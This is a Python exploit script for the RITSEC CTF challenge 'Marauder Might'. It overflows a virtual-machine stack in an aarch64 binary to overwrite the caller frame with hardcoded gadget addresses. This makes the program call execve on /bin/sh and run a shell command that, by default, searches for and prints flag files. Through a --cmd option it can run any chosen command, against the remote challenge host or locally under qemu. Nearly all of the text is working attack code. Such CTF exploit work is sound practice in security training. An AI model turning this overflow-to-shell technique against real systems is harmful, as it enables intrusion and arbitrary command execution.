import argparse
import socket
import struct
import subprocess
import sys


HOST = "marauder-might.ctf.ritsec.club"
PORT = 1739
QEMU = "qemu-aarch64"
BINARY = "./fractured_ship"

CALL_GADGET = 0x42C648
EXECVE = 0x4417C4
BINSH = 0x45B9A0

# We overflow the VM stack into the caller frame of 0x4009c0.
PUSHES_TO_CALLER_FRAME = 258

# constant table indexes
IDX_ZERO = 0
IDX_CALL_GADGET = 1
IDX_EXECVE = 2
IDX_BINSH = 3

# qword slots written after reaching the caller frame:
# saved x29, saved x30, junk, junk, junk, x8, x1, x0, x2, x4
FRAME_LAYOUT = [
    IDX_ZERO,
    IDX_CALL_GADGET,
    IDX_ZERO,
    IDX_ZERO,
    IDX_ZERO,
    IDX_EXECVE,
    IDX_ZERO,
    IDX_BINSH,
    IDX_ZERO,
    IDX_ZERO,
]

DEFAULT_CMD = (
    "cat flag.txt 2>/dev/null || "
    "cat /flag.txt 2>/dev/null || "
    "(find / -maxdepth 2 -name 'flag*' -type f 2>/dev/null | "
    "while read f; do cat \"$f\" 2>/dev/null; done); "
    "exit"
)


def p32(value: int) -> bytes:
    return struct.pack("<I", value)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def build_payload(command: str) -> bytes:
    constants = [
        0,
        CALL_GADGET,
        EXECVE,
        BINSH,
    ]

    payload = bytearray()
    payload += p32(len(constants))
    payload += b"".join(p64(x) for x in constants)

    for _ in range(PUSHES_TO_CALLER_FRAME):
        payload += bytes((0, IDX_ZERO))

    for idx in FRAME_LAYOUT:
        payload += bytes((0, idx))

    payload += b"\x01"
    payload += command.encode()
    if not payload.endswith(b"\n"):
        payload += b"\n"
    return bytes(payload)


def recv_all(sock: socket.socket) -> bytes:
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def run_remote(payload: bytes, host: str, port: int) -> bytes:
    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(1.0)
    try:
        sock.sendall(payload)
        return recv_all(sock)
    finally:
        sock.close()


def run_local(payload: bytes) -> bytes:
    proc = subprocess.Popen(
        [QEMU, BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = proc.communicate(payload, timeout=10)
    return out


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit for RITSEC CTF Marauder Might")
    parser.add_argument("--local", action="store_true", help="run against local binary with qemu-aarch64")
    parser.add_argument("--host", default=HOST, help="remote host")
    parser.add_argument("--port", default=PORT, type=int, help="remote port")
    parser.add_argument("--cmd", default=DEFAULT_CMD, help="shell command to run after spawning /bin/sh")
    args = parser.parse_args()

    payload = build_payload(args.cmd)

    if args.local:
        out = run_local(payload)
    else:
        out = run_remote(payload, args.host, args.port)

    sys.stdout.buffer.write(out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
